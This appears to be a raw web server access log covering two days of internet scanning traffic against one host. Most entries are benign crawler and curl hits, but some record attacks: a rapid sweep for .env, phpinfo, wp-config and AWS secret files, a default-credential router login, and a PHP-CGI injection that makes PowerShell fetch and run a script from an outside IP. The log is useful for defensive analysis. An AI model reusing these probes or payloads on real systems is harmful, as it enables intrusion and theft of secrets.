181.191.49.0 - - [04/Jan/2025:12:28:00 +0000] "GET /images/img.png HTTP/1.1" 200 11006007 "http://34.155.227.229/camera" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
211.220.190.19 - - [05/Jan/2025:14:32:31 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
93.174.93.12 - - [05/Jan/2025:14:44:57 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 6.0; Le X620 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36"
14.46.67.124 - - [05/Jan/2025:14:50:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
114.33.112.152 - - [05/Jan/2025:14:56:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [05/Jan/2025:15:19:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.87 Safari/537.36"
193.34.212.75 - - [05/Jan/2025:15:20:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
123.110.240.253 - - [05/Jan/2025:15:34:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.79.181.179 - - [05/Jan/2025:15:50:27 +0000] "\x16\x03\x01" 400 524 "-" "-"
139.59.101.104 - - [05/Jan/2025:16:02:24 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
193.34.212.75 - - [05/Jan/2025:16:28:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [05/Jan/2025:16:32:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.98.11.119 - - [05/Jan/2025:16:52:45 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
125.228.126.78 - - [05/Jan/2025:17:00:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [05/Jan/2025:17:10:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
218.157.111.47 - - [05/Jan/2025:17:20:04 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
123.193.231.120 - - [05/Jan/2025:17:21:50 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
179.43.191.146 - - [05/Jan/2025:17:28:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
81.161.238.40 - - [05/Jan/2025:17:44:10 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; FreeBSD amd64; rv:54.0) Gecko/20100101 Firefox/54.0"
172.104.11.46 - - [05/Jan/2025:17:47:08 +0000] "\x16\x03\x01" 400 524 "-" "-"
125.228.85.185 - - [05/Jan/2025:17:48:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [05/Jan/2025:17:53:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.52.254 - - [05/Jan/2025:18:02:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
121.142.206.41 - - [05/Jan/2025:18:10:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /docker/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /env.backup HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /xampp/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /lara/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /lara/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /.vscode/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /js/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/core/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /mail/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /mailer/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /nginx/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /public/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /site/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /xampp/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /.docker/laravel/app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/core/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/core/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /laravel/core/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /main/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [05/Jan/2025:18:12:07 +0000] "GET /node_modules/.env HTTP/1.1" 302 386 "-" "-"
92.255.57.58 - - [05/Jan/2025:18:43:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
220.81.234.253 - - [05/Jan/2025:19:00:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
154.213.184.132 - - [05/Jan/2025:19:02:14 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
46.19.138.234 - - [05/Jan/2025:19:24:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.36.243.218 - - [05/Jan/2025:19:33:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [05/Jan/2025:19:38:13 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [05/Jan/2025:19:38:13 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.34.212.75 - - [05/Jan/2025:19:50:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.71.84.54 - - [05/Jan/2025:20:01:58 +0000] "\x16\x03\x01" 400 524 "-" "-"
167.71.84.54 - - [05/Jan/2025:20:01:58 +0000] "\x16\x03\x01" 400 524 "-" "-"
167.71.84.54 - - [05/Jan/2025:20:01:58 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.84.54 - - [05/Jan/2025:20:01:58 +0000] "GET /form.html HTTP/1.1" 302 331 "-" "curl/8.1.2"
167.71.84.54 - - [05/Jan/2025:20:01:58 +0000] "GET /upl.php HTTP/1.1" 302 331 "-" "Mozilla/5.0"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /t4 HTTP/1.1" 302 331 "-" "Mozilla/5.0"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /geoip/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /1.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /systembc/password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
167.71.84.54 - - [05/Jan/2025:20:01:59 +0000] "GET /password.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
172.169.3.38 - - [05/Jan/2025:20:02:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
147.185.132.36 - - [05/Jan/2025:20:14:47 +0000] "\x16\x03\x01" 400 524 "-" "-"
147.185.132.36 - - [05/Jan/2025:20:14:47 +0000] "\x16\x03\x01" 400 524 "-" "-"
121.188.115.113 - - [05/Jan/2025:20:18:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
59.2.104.207 - - [05/Jan/2025:20:19:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [05/Jan/2025:20:23:48 +0000] "\x16\x03\x01\x05\xa8\x01" 400 524 "-" "-"
121.153.145.50 - - [05/Jan/2025:20:27:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
222.118.134.95 - - [05/Jan/2025:20:28:23 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
62.212.32.222 - - [05/Jan/2025:20:32:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
205.210.31.2 - - [05/Jan/2025:20:35:17 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
118.38.36.171 - - [05/Jan/2025:20:57:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [05/Jan/2025:21:25:16 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
121.137.73.87 - - [05/Jan/2025:21:42:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.181.166.92 - - [05/Jan/2025:21:55:45 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
80.82.77.202 - - [05/Jan/2025:21:57:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
118.34.195.16 - - [05/Jan/2025:22:27:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
103.203.56.1 - - [05/Jan/2025:22:38:08 +0000] "GET / HTTP/1.1" 200 1761 "-" "HTTP Banner Detection (https://security.ipip.net)"
91.223.3.201 - - [05/Jan/2025:22:49:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [05/Jan/2025:23:13:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
121.151.75.159 - - [05/Jan/2025:23:18:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
206.168.34.206 - - [05/Jan/2025:23:24:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.206 - - [05/Jan/2025:23:24:14 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [05/Jan/2025:23:24:16 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [05/Jan/2025:23:24:18 +0000] "GET / HTTP/1.1" 200 966 "http://34.155.227.229/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.206 - - [05/Jan/2025:23:24:19 +0000] "PRI * HTTP/2.0" 400 524 "-" "-"
52.228.154.198 - - [05/Jan/2025:23:36:46 +0000] "GET /hudson HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
112.248.115.211 - - [05/Jan/2025:23:38:29 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 302 350 "-" "-"
166.88.134.89 - - [05/Jan/2025:23:51:53 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('powershell.exe%20-Command%20%22%26%20%7Biwr%20-Uri%20http%3A%2F%2F23.27.51.244%2Fscript.ps1%20-OutFile%20script.ps1%3B%20.%2Fscript.ps1%7D%22');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
166.88.134.89 - - [05/Jan/2025:23:51:53 +0000] "GET / HTTP/1.1" 200 947 "http://34.155.227.229/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('powershell.exe%20-Command%20%22%26%20%7Biwr%20-Uri%20http%3A%2F%2F23.27.51.244%2Fscript.ps1%20-OutFile%20script.ps1%3B%20.%2Fscript.ps1%7D%22');?>" "Go-http-client/1.1"
147.185.132.217 - - [05/Jan/2025:23:55:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
221.164.133.94 - - [05/Jan/2025:23:57:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [05/Jan/2025:23:58:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
